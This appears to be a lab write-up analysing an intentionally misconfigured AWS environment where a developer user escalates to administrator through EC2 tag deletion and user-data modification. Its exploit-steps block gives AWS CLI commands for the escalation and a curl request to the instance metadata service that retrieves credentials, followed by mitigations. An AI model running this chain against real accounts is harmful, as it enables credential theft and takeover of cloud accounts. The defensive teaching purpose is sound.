# iam_privesc_by_ec2 — Misconfiguration Report

## Environment Overview

The environment consists of an EC2 instance and several IAM entities that create a privilege escalation path due to overly permissive permissions and weak tag-based access controls.

- IAM User (cg_dev_user) — Initial user with ReadOnlyAccess and several EC2 permissions including the ability to delete tags.
- IAM Role (cg_ec2_management_role) — Role that allows EC2 management actions such as starting, stopping, and modifying instance attributes under certain conditions.
- EC2 Instance (admin_ec2) — Administrative instance that uses an IAM role with full administrator privileges.
- IAM Role (cg_ec2_role) — Instance role attached to the EC2 instance with AdministratorAccess.

The attacker begins with access to the cg_dev_user account and abuses IAM permissions and EC2 configuration weaknesses to compromise the administrative EC2 instance and obtain privileged credentials.

---

## Attack Chain Summary

```text
IAM User (cg_dev_user)
      ↓ enumerates IAM roles and permissions
EC2 Tag-Based Restrictions
      ↓ removes identifying tag
admin_ec2 instance
      ↓ assumes role
cg_ec2_management_role
      ↓ modifies EC2 instance attributes
EC2 Instance (admin_ec2)
      ↓ executes malicious user data
Instance Metadata Service
      ↓ retrieves
Administrator credentials
```

### Exploit Steps

1. The attacker begins with credentials for the IAM user cg_dev_user.
2. Using the ReadOnlyAccess policy, they enumerate IAM roles and policies within the account.
3. They discover that they are allowed to assume the cg_ec2_management_role.
4. The attacker notices that the role allows EC2 instance management actions but restricts them when the instance has a specific tag.
5. Because cg_dev_user has ec2:DeleteTags permission, the attacker removes the tag from the administrative EC2 instance.
6. With the tag removed, the attacker assumes the cg_ec2_management_role.
7. Using the role’s ec2:ModifyInstanceAttribute permission, the attacker modifies the EC2 instance user data to execute a command that extracts credentials.
8. When the instance runs the modified user data script, the attacker retrieves administrator credentials from the instance metadata service, gaining full access to the AWS account.

```bash
# Step 1 – enumerate IAM roles
aws iam list-roles

# Step 2 – view role permissions
aws iam get-role --role-name cg_ec2_management_role

# Step 3 – remove protective tag from admin instance
aws ec2 delete-tags \
--resources <admin_ec2_instance_id> \
--tags Key=Name,Value=cg_admin_ec2

# Step 4 – assume EC2 management role
aws sts assume-role \
--role-arn arn:aws:iam::<account>:role/cg_ec2_management_role \
--role-session-name privesc

# Step 5 – modify instance user data
aws ec2 modify-instance-attribute \
--instance-id <admin_ec2_instance_id> \
--attribute userData \
--value <malicious payload>

# Step 6 – retrieve credentials from metadata service
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Misconfiguration Findings

### 1. Tag-Based Access Control Bypass

**What:** The cg_ec2_management_role restricts EC2 management actions using a tag condition:

```[json]
Condition = {
  StringNotEquals = {
    "aws:ResourceTag/Name" = "cg_admin_ec2"
  }
}
```
However, the cg_dev_user has permission to delete EC2 tags:

```[json]
"Action": [
  "ec2:DeleteTags"
]
```

Because of this, the attacker can remove the tag protecting the administrative instance, bypassing the intended access restriction.

**Mitigation:**

- Deny tag modification on protected resources.
- Use explicit deny policies for critical instance tags.
- Implement resource protection policies for administrative instances.

**Why bother:** Tag-based security controls are ineffective if attackers can modify or delete the tags enforcing those controls.

---

### 2. Overly Permissive EC2 Management Role

**What:** The cg_ec2_management_role allows the following permissions:

```[language]
"Action": [
  "ec2:StartInstances",
  "ec2:StopInstances",
  "ec2:ModifyInstanceAttribute"
]
```

These permissions allow attackers to modify EC2 configuration, including user data, which can execute commands on instance startup.

**Mitigation:**

- Restrict EC2 modification permissions to trusted administrators.
- Limit ModifyInstanceAttribute permissions.
- Use instance configuration monitoring.

**Why bother:** EC2 modification permissions can lead to remote command execution on instances.

---

### 3. AdministratorAccess on EC2 Instance Role

**What:** The EC2 instance role attached to the administrative instance has the AWS managed policy:

- `AdministratorAccess`  — grants full control over all AWS resources

If an attacker gains access to the instance or metadata service credentials, they obtain full administrative privileges.

**Mitigation:**

- Apply least privilege IAM roles.
- Restrict instance roles to only required permissions.
- Use separate roles for administrative tasks.

**Why bother:** Compromise of an instance with administrative privileges leads to full cloud environment compromise.

---

## Severity & Impact

| Factor               | Reality                                                               |
| -------------------- | --------------------------------------------------------------------- |
| Skill Required       | Medium — requires understanding of IAM permissions and EC2 attributes |
| Exploit Time         | Low — attack can be completed in minutes                              |
| Detection Likelihood | Low — actions appear as legitimate EC2 management                     |
| Data Obtained        | Administrator credentials                                             |
| Blast Radius         | Entire AWS account                                                    |

The attacker can escalate from a limited developer account to full administrator access through misconfigured IAM permissions and weak EC2 protections.

---

## Bottom Line

This scenario demonstrates how weak IAM design and misconfigured EC2 permissions can lead to full privilege escalation. A developer user with the ability to delete resource tags can bypass tag-based restrictions and assume a role that allows EC2 modification. By altering instance configuration, the attacker gains access to administrator credentials from the instance metadata service. Applying least privilege principles and protecting critical resource tags would significantly reduce the risk of this attack.
